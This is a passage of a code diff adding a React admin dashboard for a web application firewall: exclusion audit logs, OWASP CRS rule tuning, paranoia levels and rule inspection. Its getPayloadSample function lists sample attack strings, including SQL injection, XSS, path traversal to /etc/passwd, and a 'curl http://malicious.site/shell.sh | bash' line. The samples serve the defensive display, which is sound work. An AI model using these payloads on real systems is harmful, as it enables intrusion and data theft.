+                                onClick={() => {
+                                  setEditingExclusion(entry);
+                                  setEditNotes(entry.notes);
+                                  setIsNoteModalOpen(true);
+                                }}
+                                style={{ padding: '4px 8px', fontSize: '11px', borderColor: 'rgba(59, 130, 246, 0.4)', color: '#93c5fd' }}
+                              >
+                                Edit Note
+                              </button>
+
+                              <button
+                                className="action-btn-inspect"
+                                onClick={() => handleDeleteExclusion(entry.id)}
+                                style={{ padding: '4px 8px', fontSize: '11px', borderColor: 'rgba(239, 68, 68, 0.4)', color: '#fca5a5' }}
+                              >
+                                Delete
+                              </button>
+                            </div>
+                          </td>
+                        </motion.tr>
+                      );
+                    })}
+                  </AnimatePresence>
+                </tbody>
+              </table>
+            )}
+          </div>
+
+          {analytics && analytics.top_excluded_rules && analytics.top_excluded_rules.length > 0 && (
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px', marginTop: '10px' }}>
+              <div className="glass-panel" style={{ padding: '20px' }}>
+                <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                  <AlertTriangle size={16} color="#f97316" />
+                  <span>Most Frequently Excluded WAF Rules</span>
+                </div>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  {analytics.top_excluded_rules.map((rule) => (
+                    <div key={rule.rule_id} style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px' }}>
+                        <span style={{ fontFamily: 'monospace', color: '#fdba74' }}>Rule #{rule.rule_id}</span>
+                        <span style={{ fontWeight: 600 }}>{rule.count} Exception Policies</span>
+                      </div>
+                      <div style={{ width: '100%', height: '5px', background: 'rgba(255,255,255,0.03)', borderRadius: '3px', overflow: 'hidden' }}>
+                        <div style={{ width: `${Math.min((rule.count / (analytics.top_excluded_rules[0]?.count || 1)) * 100, 100)}%`, height: '100%', background: 'linear-gradient(90deg, #fdba74, #f97316)', borderRadius: '3px' }}></div>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </div>
+
+              <div className="glass-panel" style={{ padding: '20px' }}>
+                <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                  <ShieldCheck size={16} color="#10b981" />
+                  <span>Top False Positive Generating Rules (Tuning Candidates)</span>
+                </div>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  {analytics.top_fp_rules && analytics.top_fp_rules.length > 0 ? (
+                    analytics.top_fp_rules.map((rule) => (
+                      <div key={rule.rule_id} style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px' }}>
+                          <span style={{ fontFamily: 'monospace', color: '#a7f3d0' }}>Rule #{rule.rule_id}</span>
+                          <span style={{ fontWeight: 600 }}>{rule.count} False Positives Flagged</span>
+                        </div>
+                        <div style={{ width: '100%', height: '5px', background: 'rgba(255,255,255,0.03)', borderRadius: '3px', overflow: 'hidden' }}>
+                          <div style={{ width: `${Math.min((rule.count / (analytics.top_fp_rules[0]?.count || 1)) * 100, 100)}%`, height: '100%', background: 'linear-gradient(90deg, #a7f3d0, #10b981)', borderRadius: '3px' }}></div>
+                        </div>
+                      </div>
+                    ))
+                  ) : (
+                    <div style={{ color: '#a1a1aa', fontSize: '12px', textAlign: 'center', padding: '20px' }}>No marked false positives triggers discovered yet.</div>
+                  )}
+                </div>
+              </div>
+            </div>
+          )}
+        </>
+      )}
+
+      {activeSubTab === 'audit_history' && (
+        <div className="table-container glass-panel" style={{ padding: 0 }}>
+          {history.length === 0 ? (
+            <div style={{ padding: '60px 40px', textAlign: 'center', color: '#a1a1aa' }}>No exceptions audit history recorded yet.</div>
+          ) : (
+            <table className="logs-table">
+              <thead>
+                <tr>
+                  <th>Timestamp</th>
+                  <th>Action</th>
+                  <th>Analyst</th>
+                  <th>Exclusion ID Reference</th>
+                  <th>Change Event Details</th>
+                </tr>
+              </thead>
+              <tbody>
+                {history.map((log) => (
+                  <tr key={log.id}>
+                    <td style={{ fontSize: '12px', color: '#94a3b8' }}>{log.timestamp}</td>
+                    <td>
+                      <span style={{
+                        fontSize: '9px',
+                        fontWeight: 700,
+                        padding: '2px 6px',
+                        borderRadius: '4px',
+                        background: log.action === 'Create' ? 'rgba(16,185,129,0.1)' : log.action === 'Delete' ? 'rgba(239,68,68,0.1)' : 'rgba(59,130,246,0.1)',
+                        color: log.action === 'Create' ? '#a7f3d0' : log.action === 'Delete' ? '#fca5a5' : '#93c5fd',
+                        textTransform: 'uppercase'
+                      }}>
+                        {log.action}
+                      </span>
+                    </td>
+                    <td style={{ fontSize: '12px', fontWeight: 500 }}>@{log.username}</td>
+                    <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>Ex-Ref #{log.exclusion_id}</td>
+                    <td style={{ fontSize: '12px', color: '#cbd5e1' }}>{log.details}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          )}
+        </div>
+      )}
+
+      <AnimatePresence>
+        {isNoteModalOpen && editingExclusion && (
+          <div className="modal-overlay" onClick={() => setIsNoteModalOpen(false)}>
+            <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '440px' }}>
+              <div className="modal-header">
+                <div className="modal-title">
+                  <Database size={18} color="#3b82f6" />
+                  <span>Update Exception Justification</span>
+                </div>
+                <button className="modal-close-btn" onClick={() => setIsNoteModalOpen(false)}>
+                  <X size={18} />
+                </button>
+              </div>
+              <form onSubmit={handleSaveNotes}>
+                <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  {errorMsg && (
+                    <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.25)', color: '#fca5a5', padding: '8px 12px', borderRadius: '6px', fontSize: '12px' }}>
+                      {errorMsg}
+                    </div>
+                  )}
+                  <div style={{ fontSize: '12px', color: '#a1a1aa' }}>
+                    Edit the administrative review notes for Rule <strong style={{ color: '#fff' }}>{editingExclusion.rule_id}</strong> exception:
+                  </div>
+                  <textarea
+                    className="settings-input"
+                    style={{ height: '100px', resize: 'none', background: 'rgba(0,0,0,0.2)', padding: '12px' }}
+                    placeholder="Enter revised justification notes..."
+                    value={editNotes}
+                    onChange={(e) => setEditNotes(e.target.value)}
+                    maxLength={400}
+                    required
+                  />
+                </div>
+                <div className="modal-footer" style={{ display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
+                  <button type="button" className="modal-btn secondary" onClick={() => setIsNoteModalOpen(false)}>Cancel</button>
+                  <button type="submit" className="modal-btn primary" style={{ background: '#3b82f6', borderColor: '#3b82f6', color: '#fff', fontWeight: 600 }}>
+                    Save Note
+                  </button>
+                </div>
+              </form>
+            </div>
+          </div>
+        )}
+      </AnimatePresence>
+
+      <ExclusionDetailsModal
+        isOpen={isExclusionModalOpen}
+        exclusion={selectedExclusion}
+        onClose={() => {
+          setIsExclusionModalOpen(false);
+          setSelectedExclusion(null);
+        }}
+      />
+    </motion.div>
+  );
+}
+
+function Rules({ userRole }) {
+  const [rules, setRules] = useState([]);
+  const [stats, setStats] = useState({
+    total_rules: 0,
+    enabled_rules: 0,
+    disabled_rules: 0,
+    paranoia_level: 1,
+    top_triggered_rules: [],
+    category_distribution: [],
+    tuning_candidates: []
+  });
+  const [history, setHistory] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [page, setPage] = useState(1);
+  const [total, setTotal] = useState(0);
+  const size = 10;
+
+  // Filters state
+  const [search, setSearch] = useState('');
+  const [category, setCategory] = useState('');
+  const [severity, setSeverity] = useState('');
+  const [statusFilter, setStatusFilter] = useState('');
+
+  // Modals / Drawer state
+  const [selectedRule, setSelectedRule] = useState(null);
+  const [ruleDetailLoading, setRuleDetailLoading] = useState(false);
+  const [detailedRule, setDetailedRule] = useState(null);
+
+  // Rule Disable Confirmation state
+  const [ruleToDisable, setRuleToDisable] = useState(null);
+  const [disableReason, setDisableReason] = useState('');
+  const [disableError, setDisableError] = useState('');
+
+  // Notification states
+  const [toast, setToast] = useState(null);
+
+  const showToast = (message, type = 'success') => {
+    setToast({ message, type });
+    setTimeout(() => setToast(null), 4000);
+  };
+
+  const fetchRulesData = async () => {
+    setLoading(true);
+    try {
+      const filters = {};
+      if (search) filters.search = search;
+      if (category) filters.category = category;
+      if (severity) filters.severity = severity;
+      if (statusFilter) filters.enabled = statusFilter === 'enabled';
+
+      const [rulesRes, statsRes, historyRes] = await Promise.all([
+        getRules(page, size, filters),
+        getRulesStats(),
+        getRulesHistory()
+      ]);
+
+      setRules(rulesRes.data);
+      setTotal(rulesRes.total);
+      setStats(statsRes);
+      setHistory(historyRes);
+    } catch (error) {
+      console.error("Failed to load WAF rules data:", error);
+      showToast("Failed to fetch WAF rules from backend.", "error");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      fetchRulesData();
+    }, 0);
+    return () => clearTimeout(timer);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [page, category, severity, statusFilter]);
+
+  // Handle Search submit
+  const handleSearchSubmit = (e) => {
+    e.preventDefault();
+    setPage(1);
+    fetchRulesData();
+  };
+
+  // Inspect rule detail
+  const handleInspectRule = async (rule) => {
+    setSelectedRule(rule);
+    setRuleDetailLoading(true);
+    setDetailedRule(null);
+    try {
+      const detail = await getRuleDetails(rule.id);
+      setDetailedRule(detail);
+    } catch (error) {
+      console.error("Failed to inspect rule details:", error);
+      showToast(`Could not load details for rule ${rule.id}`, "error");
+    } finally {
+      setRuleDetailLoading(false);
+    }
+  };
+
+  // Toggle rule state (enable directly, show modal overlay for disabling)
+  const handleToggleState = async (rule) => {
+    if (!rule.enabled) {
+      // Enabling rule: execute immediately
+      setLoading(true);
+      try {
+        const res = await enableRule(rule.id);
+        showToast(res.message || `Rule ${rule.id} has been enabled successfully.`);
+        fetchRulesData();
+      } catch (error) {
+        showToast(error.message || `Failed to enable rule ${rule.id}`, "error");
+        setLoading(false);
+      }
+    } else {
+      // Disabling rule: show confirmation prompt and require a security justification reason
+      setRuleToDisable(rule);
+      setDisableReason('');
+      setDisableError('');
+    }
+  };
+
+  // Confirm rule disabling override
+  const handleConfirmDisable = async () => {
+    if (!disableReason || disableReason.trim().length < 3) {
+      setDisableError("A valid justification reason is required to proceed.");
+      return;
+    }
+
+    setLoading(true);
+    const targetId = ruleToDisable.id;
+    setRuleToDisable(null);
+
+    try {
+      const res = await disableRule(targetId, disableReason);
+      showToast(res.message || `Rule ${targetId} has been overridden and disabled.`);
+      fetchRulesData();
+    } catch (error) {
+      showToast(error.message || `Failed to disable rule ${targetId}`, "error");
+      setLoading(false);
+    }
+  };
+
+  // Paranoia Level Change
+  const handleParanoiaLevelChange = async (level) => {
+    if (level === stats.paranoia_level) return;
+    setLoading(true);
+    try {
+      const res = await setParanoiaLevel(level);
+      showToast(res.message || `Global detection paranoia level updated to PL${level}.`);
+      fetchRulesData();
+    } catch (error) {
+      showToast(error.message || "Failed to update paranoia level", "error");
+      setLoading(false);
+    }
+  };
+
+  // Restore defaults
+  const handleRestoreDefaults = async () => {
+    if (!window.confirm("Are you sure you want to restore all OWASP CRS rules and paranoia levels to WAF system defaults?")) {
+      return;
+    }
+    setLoading(true);
+    try {
+      const res = await resetRules();
+      showToast(res.message || "WAF settings restored to system default configuration.");
+      setPage(1);
+      fetchRulesData();
+    } catch (error) {
+      showToast(error.message || "Failed to restore defaults.", "error");
+      setLoading(false);
+    }
+  };
+
+  // Trigger payload sample mapper based on Category
+  const getPayloadSample = (cat) => {
+    switch (cat) {
+      case "SQL Injection": return ["' OR 1=1 --", "UNION SELECT null, username, password FROM users", "admin' --"];
+      case "XSS": return ["<script>alert(1)</script>", "<img src=x onerror=alert(document.domain)>", "javascript:alert(1)"];
+      case "LFI": return ["../../../../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe", "/proc/self/environ"];
+      case "RCE": return ["cat /etc/passwd", "curl http://malicious.site/shell.sh | bash", "; whoami; id"];
+      case "Scanner Detection": return ["Nikto Vulnerability Scanner headers", "sqlmap parameter crawls", "nmap script triggers"];
+      default: return ["Blocked anomalous traffic payload match.", "Specialized signature match."];
+    }
+  };
+
+  return (
+    <div className="rules-container">
+      {/* Toast Alert overlay */}
+      <AnimatePresence>
+        {toast && (
+          <motion.div
+            initial={{ opacity: 0, y: -20 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: -20 }}
+            className={`toast-alert ${toast.type === 'error' ? 'error' : 'success'}`}
+            style={{
+              position: 'fixed',
+              top: '24px',
+              right: '24px',
+              zIndex: 9999,
+              padding: '12px 24px',
+              borderRadius: '8px',
+              boxShadow: '0 8px 30px rgba(0,0,0,0.5)',
+              display: 'flex',
+              alignItems: 'center',
+              gap: '10px',
+              background: toast.type === 'error' ? 'rgba(239, 68, 68, 0.95)' : 'rgba(16, 185, 129, 0.95)',
+              border: '1px solid rgba(255,255,255,0.1)',
+              color: '#fff',
+              fontWeight: 500
+            }}
+          >
+            <ShieldAlert size={18} />
+            <span>{toast.message}</span>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Top Header Card containing metrics summary and paranoia control */}
+      <motion.div
+        className="glass-panel"
+        style={{ padding: '24px', marginBottom: '8px' }}
+        initial={{ opacity: 0, y: 10 }}
+        animate={{ opacity: 1, y: 0 }}
+      >
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px', flexWrap: 'wrap', gap: '16px' }}>
+          <div className="card-title" style={{ margin: 0 }}>
+            <ShieldAlert size={20} color="#ef4444" />
+            WAF Rule Tuning & Administration
+          </div>
+          {userRole === 'admin' && (
+            <button
+              onClick={handleRestoreDefaults}
+              className="action-btn-inspect"
+              style={{ borderColor: 'rgba(168, 85, 247, 0.3)', color: '#c084fc', background: 'rgba(168, 85, 247, 0.05)' }}
+            >
+              Reset Overrides
+            </button>
+          )}
+        </div>
+
+        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '16px', marginBottom: '24px' }}>
+          <div className="metric-box" style={{ background: 'rgba(255,255,255,0.01)', border: '1px solid rgba(255,255,255,0.04)', borderRadius: '8px', padding: '12px 16px' }}>
+            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Total CRS Rules</div>
+            <div style={{ fontSize: '24px', fontWeight: 600, color: '#f4f4f5', marginTop: '4px' }}>
+              {stats.total_rules || rules.length}
+            </div>
+          </div>
+          <div className="metric-box" style={{ background: 'rgba(16, 185, 129, 0.02)', border: '1px solid rgba(16, 185, 129, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
+            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Active Guards</div>
+            <div style={{ fontSize: '24px', fontWeight: 600, color: '#10b981', marginTop: '4px' }}>
+              {stats.enabled_rules}
+            </div>
+          </div>
+          <div className="metric-box" style={{ background: 'rgba(239, 68, 68, 0.02)', border: '1px solid rgba(239, 68, 68, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
+            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Disabled Tuning Overrides</div>
+            <div style={{ fontSize: '24px', fontWeight: 600, color: '#ef4444', marginTop: '4px' }}>
+              {stats.disabled_rules}
+            </div>
+          </div>
+          <div className="metric-box" style={{ background: 'rgba(59, 130, 246, 0.02)', border: '1px solid rgba(59, 130, 246, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
+            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Paranoia Level</div>
+            <div style={{ fontSize: '24px', fontWeight: 600, color: '#3b82f6', marginTop: '4px' }}>
+              PL {stats.paranoia_level}
+            </div>
+          </div>
+        </div>
+
+        {/* Paranoia Selector Slider */}
+        <div style={{ background: 'rgba(255,255,255,0.01)', padding: '16px 20px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.04)' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
+            <div>
+              <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5' }}>OWASP CRS Paranoia Level Setting</div>
+              <div style={{ fontSize: '12px', color: '#a1a1aa', marginTop: '2px' }}>Higher paranoia levels add strict rulesets to block advanced attacks but increase risk of false positives.</div>
+            </div>
+            <span style={{ fontSize: '11px', background: 'rgba(59,130,246,0.1)', color: '#3b82f6', border: '1px solid rgba(59,130,246,0.2)', padding: '3px 8px', borderRadius: '4px', fontWeight: 600 }}>
+              ACTIVE: PL{stats.paranoia_level}
+            </span>
+          </div>
+
+          <div className="paranoia-selector-wrapper">
+            {[
+              { level: 1, label: 'PL 1: Default', desc: 'Standard protection. Extremely low risk of false triggers. Recommended for core servers.' },
+              { level: 2, label: 'PL 2: Strict', desc: 'Adds advanced syntax checking. Best balance of heavy security and business integrity.' },
+              { level: 3, label: 'PL 3: Extreme', desc: 'Strict regex filters enabled. Potential false triggers on highly customized APIs.' },
+              { level: 4, label: 'PL 4: Paranoid', desc: 'Defense-in-depth absolute guard. Highly restrictive. Ideal for ultra-secure lock-down APIs.' }
+            ].map(item => (
+              <button
+                key={item.level}
+                onClick={() => userRole === 'admin' && handleParanoiaLevelChange(item.level)}
+                className={`paranoia-level-btn ${stats.paranoia_level === item.level ? 'active' : ''}`}
+                style={userRole !== 'admin' ? { cursor: 'not-allowed', opacity: 0.6 } : {}}
+                disabled={userRole !== 'admin'}
+                title={userRole !== 'admin' ? "Only administrators can change paranoia level" : ""}
+              >
+                <div style={{ fontWeight: 600, fontSize: '13px', color: stats.paranoia_level === item.level ? '#3b82f6' : '#e4e4e7' }}>{item.label}</div>
+                <div style={{ fontSize: '10px', color: '#a1a1aa', marginTop: '6px', lineHeight: '1.4' }}>{item.desc}</div>
+              </button>
+            ))}
+          </div>
+        </div>
+      </motion.div>
+
+      {/* Main Grid View split into Rules grid and Audits sidebar */}
+      <div className="rules-grid-layout">
+
+        {/* Left Side: Rule list database and search filters */}
+        <motion.div
+          className="glass-panel"
+          style={{ padding: '24px' }}
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+        >
+          <div className="card-title" style={{ marginBottom: '20px' }}>
+            <Database size={18} color="#3b82f6" />
+            OWASP Core Ruleset Registry
+          </div>
+
+          {/* Filters Bar */}
+          <form onSubmit={handleSearchSubmit} style={{ display: 'flex', gap: '12px', marginBottom: '20px', flexWrap: 'wrap' }}>
+            <div className="search-input-wrapper" style={{ flex: 1, minWidth: '200px' }}>
+              <Search className="search-icon" size={16} style={{ left: '12px' }} />
+              <input
+                type="text"
+                placeholder="Search rule ID, description..."
+                value={search}
+                onChange={(e) => setSearch(e.target.value)}
+                className="search-input"
+                style={{ width: '100%', paddingLeft: '36px' }}
+              />
+            </div>
+
+            <select
+              value={category}
+              onChange={(e) => { setCategory(e.target.value); setPage(1); }}
+              className="filter-select"
+            >
+              <option value="">All Categories</option>
+              {Object.values(CATEGORY_MAP).map(cat => (
+                <option key={cat} value={cat}>{cat}</option>
+              ))}
+            </select>
+
+            <select
+              value={severity}
+              onChange={(e) => { setSeverity(e.target.value); setPage(1); }}
+              className="filter-select"
+            >
+              <option value="">All Severities</option>
+              <option value="Critical">Critical</option>
+              <option value="High">High</option>
+              <option value="Medium">Medium</option>
+              <option value="Low">Low</option>
+            </select>
+
+            <select
+              value={statusFilter}
+              onChange={(e) => { setStatusFilter(e.target.value); setPage(1); }}
+              className="filter-select"
+            >
+              <option value="">All Statuses</option>
+              <option value="enabled">Enabled</option>
+              <option value="disabled">Disabled Override</option>
+            </select>
+
+            <button type="submit" className="modal-btn primary">
+              Apply Filter
+            </button>
+          </form>
+
+          {/* Rules List Container */}
+          {loading ? (
+            <div style={{ display: 'flex', justifyContent: 'center', padding: '60px 0' }}>
+              <div className="spinner"></div>
+            </div>
+          ) : rules.length === 0 ? (
+            <div style={{ textAlign: 'center', padding: '60px 24px', color: '#a1a1aa' }}>
+              <ShieldCheck size={48} style={{ margin: '0 auto 12px', opacity: 0.3, color: '#10b981' }} />
+              <h3>No Rules Found</h3>
+              <p style={{ fontSize: '13px', marginTop: '6px' }}>Adjust your keyword search or active filter dropdown parameters.</p>
+            </div>
+          ) : (
+            <div className="rules-container">
+              {rules.map((rule) => (
+                <div
+                  key={rule.id}
+                  className={`rule-card ${!rule.enabled ? 'disabled' : ''}`}
+                >
+                  <div className="rule-card-info">
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
+                      <span style={{ fontSize: '11px', fontFamily: 'monospace', background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.08)', padding: '1px 6px', borderRadius: '4px', fontWeight: 600, color: '#f4f4f5' }}>
+                        {rule.id}
+                      </span>
+                      <span style={{ fontWeight: 600, fontSize: '14px', color: rule.enabled ? '#e4e4e7' : '#a1a1aa' }}>{rule.name}</span>
+
+                      {rule.paranoia_level > stats.paranoia_level && (
+                        <span style={{ fontSize: '9px', background: 'rgba(234, 179, 8, 0.05)', color: '#eab308', border: '1px solid rgba(234,179,8,0.15)', padding: '1px 5px', borderRadius: '3px', fontWeight: 500 }}>
+                          PL {rule.paranoia_level} (Inactive)
+                        </span>
+                      )}
+                    </div>
+
+                    <p style={{ fontSize: '12px', color: '#a1a1aa', margin: '2px 0 6px', lineHeight: '1.4' }}>
+                      {rule.description}
+                    </p>
+
+                    <div className="rule-card-meta">
+                      <span className="category-tag">{rule.category}</span>
+                      <span className={`severity-pill ${rule.severity.toLowerCase()}`}>{rule.severity}</span>
+                      {rule.hit_count > 0 && (
+                        <span style={{ fontSize: '11px', color: '#ef4444', fontWeight: 500, display: 'flex', alignItems: 'center', gap: '4px' }}>
+                          <AlertTriangleIcon size={12} />
+                          {rule.hit_count} hits recorded
+                        </span>
+                      )}
+                      {rule.last_triggered && (
+                        <span style={{ fontSize: '11px', color: '#a1a1aa' }}>
+                          Last: {rule.last_triggered}
+                        </span>
+                      )}
+                    </div>
+                  </div>
+
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
+                    <button
+                      onClick={() => handleInspectRule(rule)}
+                      className="action-btn-inspect"
+                    >
+                      Inspect
+                    </button>
+
+                    {/* Toggle Guard Switch */}
+                    {userRole === 'admin' ? (
+                      <div
+                        className={`toggle-switch ${rule.enabled ? 'active' : ''}`}
+                        onClick={() => handleToggleState(rule)}
+                        style={{ flexShrink: 0 }}
+                      >
+                        <div className="toggle-knob"></div>
+                      </div>
+                    ) : (
+                      <div
+                        className={`toggle-switch ${rule.enabled ? 'active' : ''}`}
+                        style={{ flexShrink: 0, opacity: 0.5, cursor: 'not-allowed' }}
+                        title="Only administrators can enable or disable rules"
+                      >
+                        <div className="toggle-knob"></div>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              ))}
+            </div>
+          )}
+
+          {/* Pagination */}
+          {!loading && total > size && (
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '24px', borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
+              <span style={{ fontSize: '13px', color: '#a1a1aa' }}>
+                Showing <strong>{Math.min(total, (page - 1) * size + 1)}</strong> to <strong>{Math.min(total, page * size)}</strong> of <strong>{total}</strong> rule entries
+              </span>
+              <div style={{ display: 'flex', gap: '8px' }}>
+                <button
+                  disabled={page === 1}
+                  onClick={() => setPage(p => Math.max(1, p - 1))}
+                  className="action-btn-inspect"
+                  style={{ opacity: page === 1 ? 0.5 : 1, pointerEvents: page === 1 ? 'none' : 'auto' }}
+                >
+                  <ChevronLeft size={16} />
+                </button>
+                <button
+                  disabled={page * size >= total}
+                  onClick={() => setPage(p => p + 1)}
+                  className="action-btn-inspect"
+                  style={{ opacity: page * size >= total ? 0.5 : 1, pointerEvents: page * size >= total ? 'none' : 'auto' }}
+                >
+                  <ChevronRight size={16} />
+                </button>
+              </div>
+            </div>
+          )}
+        </motion.div>
+
+        {/* Right Side: Tuning Recommendations and ModSecurity Change History Audits */}
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
+
+          {/* Active Tuning Candidates Card */}
+          <motion.div
+            className="glass-panel"
+            style={{ padding: '20px' }}
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+          >
+            <div className="card-title" style={{ marginBottom: '16px' }}>
+              <Activity size={18} color="#eab308" />
+              Tuning Candidates (High Trigger Rates)
+            </div>
+
+            {stats.tuning_candidates && stats.tuning_candidates.length > 0 ? (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                {stats.tuning_candidates.map(cand => (
+                  <div key={cand.rule_id} style={{ padding: '12px 14px', background: 'rgba(234, 179, 8, 0.02)', border: '1px solid rgba(234, 179, 8, 0.1)', borderRadius: '8px' }}>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
+                      <span style={{ fontSize: '11px', fontFamily: 'monospace', background: 'rgba(234, 179, 8, 0.1)', color: '#eab308', padding: '1px 5px', borderRadius: '4px', fontWeight: 600 }}>
+                        {cand.rule_id}
+                      </span>
+                      <span style={{ fontSize: '12px', color: '#fca5a5', fontWeight: 600 }}>{cand.hit_count} dynamic blocks</span>
+                    </div>
+                    <div style={{ fontSize: '12px', fontWeight: 600, color: '#f4f4f5' }}>{cand.name}</div>
+                    <div style={{ fontSize: '10px', color: '#a1a1aa', marginTop: '6px', lineHeight: '1.4' }}>
+                      <strong>Recommendation:</strong> {cand.recommendation}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div style={{ textSelf: 'center', textAlign: 'center', padding: '24px 12px', color: '#a1a1aa', fontSize: '12px' }}>
+                <ShieldCheck size={32} style={{ margin: '0 auto 8px', color: '#10b981', opacity: 0.5 }} />
+                No rule overrides recommended. Current trigger rates are stable.
+              </div>
+            )}
+          </motion.div>
+
+          {/* Change Auditing Logs Card */}
+          <motion.div
+            className="glass-panel"
+            style={{ padding: '20px' }}
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+          >
+            <div className="card-title" style={{ marginBottom: '16px' }}>
+              <Clock size={18} color="#a855f7" />
+              Administrative Audit Logs
+            </div>
+
+            <div className="audit-list">
+              {history.length === 0 ? (
+                <div style={{ textAlign: 'center', padding: '24px 12px', color: '#a1a1aa', fontSize: '12px' }}>
+                  No changes recorded in overrides database.
+                </div>
+              ) : (
+                history.map((log, index) => (
+                  <div className="audit-item" key={index}>
+                    <div className="audit-meta-header">
+                      <span style={{ fontWeight: 600 }}>@{log.username}</span>
+                      <span>{log.timestamp}</span>
+                    </div>
+                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
+                      <span className={`audit-action-badge ${log.action}`}>
+                        {log.action}
+                      </span>
+                      {log.rule_id && (
+                        <span style={{ fontFamily: 'monospace', fontSize: '11px', color: '#a1a1aa' }}>
+                          ID: {log.rule_id}
+                        </span>
+                      )}
+                    </div>
+                    <div style={{ color: '#e4e4e7', fontSize: '12px', lineHeight: '1.4', marginTop: '2px' }}>
+                      {log.details}
+                    </div>
+                  </div>
+                ))
+              )}
+            </div>
+          </motion.div>
+        </div>
+
+      </div>
+
+      {/* --- Overlay Modals Drawer for rule inspection --- */}
+      {createPortal(
+        <AnimatePresence>
+          {selectedRule && (
+            <div className="modal-overlay" onClick={() => setSelectedRule(null)}>
+              <motion.div
+                className="modal-content"
+                style={{ maxWidth: '850px' }}
+                onClick={(e) => e.stopPropagation()}
+                initial={{ scale: 0.95, opacity: 0 }}
+                animate={{ scale: 1, opacity: 1 }}
+                exit={{ scale: 0.95, opacity: 0 }}
+              >
+                <div className="modal-header">
+                  <div className="modal-title">
+                    <ShieldAlert size={20} color="#3b82f6" />
+                    <span>Inspect Rule ID: {selectedRule.id}</span>
+                  </div>
+                  <button className="modal-close-btn" onClick={() => setSelectedRule(null)}>
+                    <X size={18} />
+                  </button>
+                </div>
+
+                <div style={{ padding: '24px', overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                  <div>
+                    <h3 style={{ margin: '0 0 8px', color: '#f4f4f5' }}>{selectedRule.name}</h3>
+                    <p style={{ fontSize: '13px', color: '#a1a1aa', lineHeight: '1.5', margin: 0 }}>
+                      {selectedRule.description}
+                    </p>
+                  </div>
+
+                  <div className="rule-drawer-grid">
+                    <div className="rule-meta-box">
+                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>OWASP Category</div>
+                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5' }}>{selectedRule.category}</div>
+                    </div>
+                    <div className="rule-meta-box">
+                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>Severity Level</div>
+                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5', display: 'flex', gap: '6px', alignItems: 'center' }}>
+                        <span className={`severity-pill ${selectedRule.severity.toLowerCase()}`} style={{ display: 'inline-block' }}>{selectedRule.severity}</span>
+                      </div>
+                    </div>
+                    <div className="rule-meta-box">
+                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>CRS Paranoia Level</div>
+                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5' }}>PL {selectedRule.paranoia_level}</div>
+                    </div>
+                    <div className="rule-meta-box">
+                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>Dynamic Logs Blocks</div>
+                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#ef4444' }}>{selectedRule.hit_count} triggers</div>
+                    </div>
+                  </div>
+
+                  {/* syntax block */}
+                  <div>
